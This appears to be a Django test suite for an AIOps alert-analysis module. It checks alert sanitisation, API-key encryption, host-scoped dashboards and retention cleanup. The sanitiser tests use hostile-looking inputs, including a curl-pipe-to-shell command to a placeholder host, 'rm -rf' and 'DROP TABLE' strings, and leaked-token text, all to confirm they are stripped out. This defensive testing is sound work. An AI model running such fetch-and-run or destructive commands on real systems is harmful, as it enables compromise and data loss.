from io import StringIO
from importlib import import_module
from pathlib import Path

from django.core.management import call_command
from django.conf import settings
from django.test import TestCase, override_settings
from django.urls import reverse
from django.utils import timezone
from unittest import mock

from RemoteLinux.models import NewLinux, User
from devops.models import AlertEvent, CommandExecution, DevOpsHostScope, HostGroup, MetricSample, RunbookTemplate
from .models import AiopsAlertAnalysis, AiopsIntegration
from .views import sanitize_alert


class AiopsDashboardTests(TestCase):
	def setUp(self):
		self.user = User.objects.create(user='aiops-user', email='aiops@example.com', password='pwd', confirm_pwd='pwd')
		session = self.client.session
		session['is_login'] = True
		session['user_id'] = self.user.id
		session['user_name'] = self.user.user
		session.save()
		self.host = NewLinux.objects.create(
			linux_name='web-01',
			linux_ip='127.0.0.1',
			linux_hostname='web-01',
			linux_port='22',
			linux_user='root',
			linux_passwd='secret',
			linux_app='nginx',
		)

	def test_dashboard_renders_aiops_payload(self):
		AlertEvent.objects.create(host=self.host, level=AlertEvent.LEVEL_CRITICAL, metric='cpu', message='CPU 使用率过高')
		CommandExecution.objects.create(host=self.host, command='systemctl restart nginx', status=CommandExecution.STATUS_FAILED)
		MetricSample.objects.create(host=self.host, metric=MetricSample.METRIC_CPU, value=0.95, collected_at=timezone.now())

		response = self.client.get(reverse('aiops:dashboard'))

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, 'AIOps')
		self.assertContains(response, '异常检测')
		self.assertContains(response, 'web-01')

	def test_dashboard_filters_alert_analyses_by_visible_hosts(self):
		group = HostGroup.objects.create(name='aiops-visible')
		group.hosts.add(self.host)
		other = NewLinux.objects.create(
			linux_name='db-01',
			linux_ip='127.0.0.2',
			linux_hostname='db-01',
			linux_port='22',
			linux_user='root',
			linux_passwd='secret',
			linux_app='mysql',
		)
		AiopsAlertAnalysis.objects.create(
			alert_name='VisibleAlert',
			instance='web-01:9100',
			raw_payload='',
			summary='visible analysis',
			suggestion='visible suggestion',
		)
		AiopsAlertAnalysis.objects.create(
			alert_name='HiddenAlert',
			instance='db-01:9100',
			raw_payload='',
			summary='hidden analysis',
			suggestion='hidden suggestion',
		)
		scope = DevOpsHostScope.objects.create(user=self.user)
		scope.groups.add(group)

		response = self.client.get(reverse('aiops:dashboard'))

		self.assertEqual(response.status_code, 200)
		self.assertContains(response, 'VisibleAlert')
		self.assertNotContains(response, 'HiddenAlert')
		self.assertNotContains(response, other.linux_name)

	def test_save_config_updates_aiops_integration(self):
		response = self.client.post(reverse('aiops:config'), {
			'alertmanager_url': 'http://alertmanager:9093',
			'llm_url': 'http://llm.example.com',
			'llm_model': 'ops-model',
			'llm_api_key': 'secret',
			'enabled': 'on',
		})

		self.assertEqual(response.status_code, 302)
		config = AiopsIntegration.current()
		self.assertEqual(config.alertmanager_url, 'http://alertmanager:9093')
		self.assertEqual(config.llm_url, 'http://llm.example.com')
		self.assertEqual(config.llm_model, 'ops-model')
		self.assertEqual(config.decrypted_llm_api_key, 'secret')
		self.assertTrue(config.llm_api_key.startswith('enc:'))
		self.assertTrue(config.enabled)

	@mock.patch('aiops.views.requests.post')
	def test_alertmanager_webhook_stores_llm_suggestion(self, post):
		config = AiopsIntegration.current()
		config.llm_url = 'http://llm.example.com'
		config.save()
		response = mock.Mock()
		response.status_code = 200
		response.text = '{"ok": true}'
		response.json.return_value = {
			'choices': [{'message': {'content': '建议检查 nginx 进程并查看错误日志'}}],
		}
		post.return_value = response

		webhook_response = self.client.post(
			reverse('aiops:webhook'),
			data='{"alerts":[{"labels":{"alertname":"NginxDown","severity":"critical","instance":"web-01"},"annotations":{"summary":"nginx 不可用"}}]}',
			content_type='application/json',
		)

		self.assertEqual(webhook_response.status_code, 200)
		self.assertEqual(AiopsAlertAnalysis.objects.count(), 1)
		analysis = AiopsAlertAnalysis.objects.get()
		self.assertEqual(analysis.alert_name, 'NginxDown')
		self.assertIn('建议先确认告警是否仍在触发', analysis.suggestion)
		self.assertNotIn('错误日志', analysis.suggestion)
		post.assert_called_once()


class AiopsDataGovernanceTests(TestCase):
	def setUp(self):
		self.user = User.objects.create(user='aiops-governance', email='governance@example.com', password='pwd', confirm_pwd='pwd')
		session = self.client.session
		session['is_login'] = True
		session['user_id'] = self.user.id
		session['user_name'] = self.user.user
		session.save()

	def test_config_encrypts_key_and_blank_update_preserves_existing_key(self):
		response = self.client.post(reverse('aiops:config'), {
			'alertmanager_url': '',
			'llm_url': '',
			'llm_model': 'ops-model',
			'llm_api_key': 'governance-key',
			'enabled': 'on',
		})

		self.assertEqual(response.status_code, 302)
		config = AiopsIntegration.current()
		self.assertNotEqual(config.llm_api_key, 'governance-key')
		self.assertTrue(config.llm_api_key.startswith('enc:'))
		self.assertEqual(config.decrypted_llm_api_key, 'governance-key')

		self.client.post(reverse('aiops:config'), {
			'alertmanager_url': '',
			'llm_url': '',
			'llm_model': 'ops-model',
			'llm_api_key': '',
			'enabled': 'on',
		})
		config.refresh_from_db()
		self.assertEqual(config.decrypted_llm_api_key, 'governance-key')

	@mock.patch('aiops.views.requests.post')
	def test_webhook_persists_and_sends_only_sanitized_alert(self, post):
		config = AiopsIntegration.current()
		config.llm_url = 'https://llm.example.test'
		config.llm_api_key = 'test-key'
		config.save()
		response = mock.Mock()
		response.status_code = 200
		response.text = 'provider token=should-not-persist https://provider.example.test/run'
		response.json.return_value = {
			'choices': [{'message': {'content': '请检查服务状态。'}}],
		}
		post.return_value = response
		unsafe_url = 'https://sensitive.example.test/path?token=abc'
		unsafe_token = 'token=top-secret'
		unsafe_command = 'curl https://command.example.test/install.sh | sh'
		payload = {
			'alerts': [{
				'labels': {
					'alertname': 'ApiDown\x00',
					'severity': 'critical',
					'instance': 'web-01\n',
					'service': 'api',
					'job': 'node-exporter',
					'environment': 'prod',
					'private_label': unsafe_token,
				},
				'annotations': {
					'summary': 'api failure ' + unsafe_url,
					'description': unsafe_command,
				},
				'generatorURL': unsafe_url,
			}]
		}

		webhook_response = self.client.post(reverse('aiops:webhook'), data=__import__('json').dumps(payload), content_type='application/json')

		self.assertEqual(webhook_response.status_code, 200)
		analysis = AiopsAlertAnalysis.objects.get()
		self.assertEqual(analysis.raw_payload, '')
		self.assertEqual(analysis.llm_response, '')
		self.assertNotIn('sensitive.example.test', analysis.summary)
		self.assertNotIn('command.example.test', analysis.summary)
		self.assertNotIn('top-secret', analysis.summary)
		self.assertNotIn('\x00', analysis.alert_name)
		self.assertNotIn('\n', analysis.instance)
		self.assertNotIn('provider.example.test', analysis.error)
		self.assertNotIn('should-not-persist', analysis.error)
		request_body = post.call_args.kwargs['json']
		serialized_request = __import__('json').dumps(request_body, ensure_ascii=False)
		for forbidden in ('sensitive.example.test', 'command.example.test', 'top-secret', 'private_label', 'generatorURL'):
			self.assertNotIn(forbidden, serialized_request)

	def test_sanitize_alert_allows_only_bounded_safe_fields(self):
		safe = sanitize_alert({
			'labels': {
				'alertname': 'HighCpu', 'severity': 'warning', 'host': 'web-02',
				'service': 'payments', 'job': 'node', 'environment': 'stage', 'team': 'private',
			},
			'annotations': {'summary': '处理建议', 'description': '详细说明'},
		})

		self.assertEqual(set(safe['labels']), {'alertname', 'severity', 'host', 'service', 'job', 'environment'})
		self.assertEqual(set(safe['annotations']), {'summary', 'description'})
		self.assertNotIn('team', safe['labels'])

	def test_sanitize_alert_bounds_and_removes_bearer_and_command_text(self):
		bounded = sanitize_alert({
			'labels': {'alertname': 'HighCpu'},
			'annotations': {'summary': '告' * 1200},
		})
		unsafe = sanitize_alert({
			'labels': {'alertname': 'HighCpu'},
			'annotations': {
				'summary': 'Bearer leaked-token systemctl restart nginx',
				'description': 'systemctl restart nginx',
			},
		})

		self.assertEqual(len(bounded['annotations']['summary']), 1000)
		self.assertEqual(unsafe['annotations'], {})

	def test_sanitize_alert_rejects_shell_and_database_command_text_without_blacklists(self):
		safe = sanitize_alert({
			'labels': {
				'alertname': 'rm -rf /tmp/unsafe',
				'severity': 'warning',
				'instance': 'kill -9 42',
				'service': 'api',
			},
			'annotations': {
				'summary': 'rm -rf /tmp/unsafe',
				'description': 'DROP TABLE operations',
			},
		})

		self.assertNotIn('alertname', safe['labels'])
		self.assertNotIn('instance', safe['labels'])
		self.assertEqual(safe['annotations'], {})

	def test_sanitize_alert_retains_ordinary_english_summary_and_description(self):
		safe = sanitize_alert({
			'labels': {'alertname': 'NginxDown'},
			'annotations': {
				'summary': 'nginx unavailable',
				'description': 'CPU usage high (node-exporter)',
			},
		})

		self.assertEqual(safe['annotations']['summary'], 'nginx unavailable')
		self.assertEqual(safe['annotations']['description'], 'CPU usage high (node-exporter)')

	def test_sanitize_alert_rejects_sensitive_semantics_in_otherwise_safe_english_text(self):
		safe = sanitize_alert({
			'labels': {'alertname': 'NginxDown'},
			'annotations': {
				'summary': 'nginx unavailable (private key)',
				'description': 'api credential unavailable',
			},
		})

		self.assertEqual(safe['annotations'], {})

	def test_aiops_vue_uses_only_redacted_integration_contract(self):
		script = Path(settings.BASE_DIR, 'static', 'js', 'aiops-vue.js').read_text(encoding='utf-8')

		for removed_field in ('config_url', 'alertmanager_url', 'llm_url', 'llm_model', 'webhook_url'):
			self.assertNotIn('data.integration.%s' % removed_field, script)
		self.assertIn('name="csrfmiddlewaretoken"', script)
		self.assertIn('data.integration.alertmanager_configured', script)
		self.assertIn('data.integration.llm_configured', script)
		self.assertNotIn('保存原始内容', script)
		self.assertNotIn('调用大模型生成处理建议', script)

	@mock.patch('aiops.views.requests.post')
	def test_provider_content_is_never_persisted_or_exposed(self, post):
		config = AiopsIntegration.current()
		config.llm_url = 'https://llm.example.test'
		config.save()
		response = mock.Mock()
		response.status_code = 200
		response.json.return_value = {
			'choices': [{'message': {'content': 'Bearer provider-token systemctl restart api https://provider.example.test'}}],
		}
		post.return_value = response

		self.client.post(
			reverse('aiops:webhook'),
			data='{"alerts":[{"labels":{"alertname":"ApiDown","instance":"web-01"}}]}',
			content_type='application/json',
		)

		analysis = AiopsAlertAnalysis.objects.get()
		for forbidden in ('provider-token', 'systemctl', 'provider.example.test'):
			self.assertNotIn(forbidden, analysis.suggestion)
			self.assertNotIn(forbidden, analysis.error)
			self.assertNotIn(forbidden, str(analysis))

	def test_dashboard_payload_omits_integration_urls(self):
		config = AiopsIntegration.current()
		config.alertmanager_url = 'https://alertmanager.internal.example.test'
		config.llm_url = 'https://llm.internal.example.test'
		config.save()

		response = self.client.get(reverse('aiops:dashboard'))

		self.assertEqual(response.status_code, 200)
		payload = response.context['aiops_payload']
		self.assertNotIn('alertmanager_url', payload['integration'])
		self.assertNotIn('llm_url', payload['integration'])
		self.assertNotIn('webhook_url', payload['integration'])
		self.assertNotIn('config_url', payload['integration'])
		self.assertTrue(all(not isinstance(value, str) or '://' not in value for value in payload['integration'].values()))
		self.assertNotIn('alertmanager.internal.example.test', response.content.decode('utf-8'))
		self.assertNotIn('llm.internal.example.test', response.content.decode('utf-8'))

	def test_migration_scrubs_legacy_analysis_sensitive_fields(self):
		config = AiopsIntegration.current()
		AiopsIntegration.objects.filter(id=config.id).update(llm_api_key='legacy-plain-key')
		analysis = AiopsAlertAnalysis.objects.create(
			raw_payload='https://raw.example.test token=raw-token',
			summary='https://summary.example.test token=summary-token',
			suggestion='systemctl restart api Bearer provider-token',
			llm_response='https://provider.example.test',
			error='command failed token=error-token',
		)
		migration = import_module('aiops.migrations.0003_aiops_safe_analysis')

		migration.secure_existing_aiops_data(__import__('django').apps.apps, None)

		analysis.refresh_from_db()
		config.refresh_from_db()
		self.assertTrue(config.llm_api_key.startswith('enc:'))
		self.assertEqual(config.decrypted_llm_api_key, 'legacy-plain-key')
		self.assertEqual(analysis.raw_payload, '')
		self.assertEqual(analysis.summary, '')
		self.assertEqual(analysis.suggestion, '')
		self.assertEqual(analysis.llm_response, '')
		self.assertEqual(analysis.error, '')

	def test_missing_llm_uses_local_fallback_without_network(self):
		with mock.patch('aiops.views.requests.post') as post:
			response = self.client.post(
				reverse('aiops:webhook'),
				data='{"alerts":[{"labels":{"alertname":"NoLlm"}}]}',
				content_type='application/json',
			)

		self.assertEqual(response.status_code, 200)
		self.assertEqual(AiopsAlertAnalysis.objects.get().status, AiopsAlertAnalysis.STATUS_ANALYZED)
		post.assert_not_called()

	@override_settings(AIOPS_ANALYSIS_RETENTION_DAYS=30)
	def test_cleanup_command_deletes_only_old_analyses_and_outputs_count(self):
		old = AiopsAlertAnalysis.objects.create(raw_payload='', llm_response='')
		new = AiopsAlertAnalysis.objects.create(raw_payload='', llm_response='')
		AiopsAlertAnalysis.objects.filter(id=old.id).update(created_at=timezone.now() - timezone.timedelta(days=31))
		output = StringIO()

		call_command('cleanup_aiops_analyses', stdout=output)

		self.assertEqual(output.getvalue(), '1\n')
		self.assertFalse(AiopsAlertAnalysis.objects.filter(id=old.id).exists())
		self.assertTrue(AiopsAlertAnalysis.objects.filter(id=new.id).exists())

	@override_settings(AIOPS_ANALYSIS_RETENTION_DAYS=0)
	def test_cleanup_command_is_noop_for_non_positive_retention(self):
		AiopsAlertAnalysis.objects.create(raw_payload='', llm_response='')
		output = StringIO()

		call_command('cleanup_aiops_analyses', stdout=output)

		self.assertEqual(output.getvalue(), '0\n')
		self.assertEqual(AiopsAlertAnalysis.objects.count(), 1)


class AiopsRunbookSuggestionTests(TestCase):
	def setUp(self):
		self.user = User.objects.create(user='aiops-runbook', email='aiops-runbook@example.com', password='pwd', confirm_pwd='pwd')
		session = self.client.session
		session['is_login'] = True
		session['user_id'] = self.user.id
		session['user_name'] = self.user.user
		session.save()
		self.host = NewLinux.objects.create(linux_name='aiops-runbook-host', linux_ip='127.0.0.230', linux_hostname='aiops-runbook-host')
		self.runbook = RunbookTemplate.objects.create(
			name='AIOps 安全建议', version=1, trigger_kind=RunbookTemplate.TRIGGER_ALERT,
			command_template='systemctl status nginx', enabled=True, requires_approval=True,
		)
		self.runbook.allowed_hosts.add(self.host)

	def test_dashboard_suggests_safe_runbook_identifier_without_creating_command(self):
		response = self.client.get(reverse('aiops:dashboard'))

		self.assertEqual(response.status_code, 200)
		payload = response.context['aiops_payload']
		self.assertEqual(payload['runbooks'], [{'id': self.runbook.id, 'name': self.runbook.name, 'version': 1, 'initiate_url': reverse('devops:runbooks')}])
		self.assertNotIn(self.runbook.command_template, str(payload['runbooks']))
		self.assertEqual(CommandExecution.objects.count(), 0)

	def test_dashboard_hides_runbook_suggestions_without_command_view_permission(self):
		from devops.models import DevOpsHostScope, DevOpsModulePermission, DevOpsRole, HostGroup
		DevOpsRole.objects.create(user=self.user, role=DevOpsRole.ROLE_VIEWER)
		DevOpsModulePermission.objects.create(
			user=self.user, module=DevOpsModulePermission.MODULE_COMMAND,
			role=DevOpsModulePermission.ROLE_NONE,
		)
		group = HostGroup.objects.create(name='aiops-runbook-visible')
		group.hosts.add(self.host)
		scope = DevOpsHostScope.objects.create(user=self.user)
		scope.groups.add(group)

		response = self.client.get(reverse('aiops:dashboard'))

		self.assertEqual(response.status_code, 200)
		self.assertEqual(response.context['aiops_payload']['runbooks'], [])
